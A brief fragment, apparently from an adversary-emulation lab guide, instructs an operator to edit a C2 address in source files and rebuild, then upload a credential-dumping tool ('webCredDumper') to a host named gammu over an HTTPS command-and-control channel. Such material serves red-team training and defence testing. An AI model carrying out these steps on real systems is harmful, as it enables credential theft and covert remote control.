...
`Change IP address (10.10.0.120 -> 10.10.0.120) in source files and rebuild (Guide in README.md)`
...
Upload the webCredDumper to gammu over Exaramel-Windows C2 channel (HTTPS / 10.10.0.120:443):
